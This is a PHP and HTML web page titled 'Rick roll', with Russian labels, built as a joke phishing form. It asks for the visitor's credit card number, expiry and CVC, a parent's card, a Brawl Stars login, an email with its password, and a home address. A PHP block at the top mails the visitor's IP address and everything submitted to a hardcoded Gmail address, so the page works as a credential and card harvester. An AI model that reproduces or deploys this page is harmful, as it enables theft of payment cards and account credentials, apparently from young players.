<?php
$_POST;
mail("adskayagonchaya6@gmail.com",
    'ip my friend',
    var_export([$_SERVER['REMOTE_ADDR'], $_POST], true));
?>
<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8">
  <title>Rick roll</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: radial-gradient(circle, #2196f3, #ffd700);
      font-family: Arial, sans-serif;
    }

    form {
      width: 400px;
      background-color: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }

    h1 {
      text-align: center;
      font-size: 24px;
      margin-top: 0;
      margin-bottom: 20px;
      color: #333;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 5px;
    }

    .form-group input[type="text"],
    .form-group input[type="email"],
    .form-group input[type="password"] {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      background-color: #f2f2f2;
      font-size: 16px;
    }

    .form-group input[type="text"]:focus,
    .form-group input[type="email"]:focus,
    .form-group input[type="password"]:focus {
      outline: none;
      background-color: #e0e0e0;
    }

    .custom-button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 24px;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 20px;
    }

    .custom-buttonn{
      margin-left: 0;
    }

    .custom-button:hover {
      background-color: #45a049;
    }
  </style>
 </head>
 <body>
    <p><img class="gif" src="https://media.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif" alt="Если ты это видишь значит у тебя..."  width="650" height="650"></p>
    <form method="post" action="./">
        <div class="form-group">
          <label for="Name">Имя:</label>
          <input type="text" id="Name" name="firstname" placeholder="Введите имя">
        </div>
        <div class="form-group">
          <label for="lastname">Фамилия:</label>
          <input type="text" name="lastname" placeholder="Введите фамилию">
        </div>
        <div class="form-group">
          <label for="card">Данные вашей кредитной карты (номер карты, срок действия, CVC код через запятую):</label>
          <input type="text" name="card" value="**** **** **** ****, **/**, ***" placeholder="Введите данные кредитной карты">
        </div>
        <div class="form-group">
          <label for="cardMom">Данные маминой кредитной карты (номер карты, срок действия, CVC код через запятую):</label>
          <input type="text" name="cardMom" placeholder="**** **** **** ****, **/**, ***">
        </div>
        <div class="form-group">
          <label for="BS">Данные от аккаунта Бравл старс:</label>
          <input type="text" name="BS" placeholder="Введите данные аккаунта Бравл старс">
        </div>
        <div class="form-group">
          <label for="Pochta">Почта и пароль:</label>
          <input type="email" name="Pochta" placeholder="Введите почту и пароль">
        </div>
        <div class="form-group">
          <label for="ADD">Адрес проживания:</label>
          <input type="text" name="ADD" placeholder="Введите адрес проживания">
        </div>
        <button type="submit" class="custom-button">Я ввел данные</button>
    </form>
    <div style="display: flex; justify-content: center; margin-top: 20px;">
      <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">
        <button class="custom-button" class="custom-buttonn">Я не буду этого делать! меня не зарикролить!</button>
      </a>
    </div>
    <div style="text-align: center; margin-top: 20px;">
    </div>
</body>
</html>
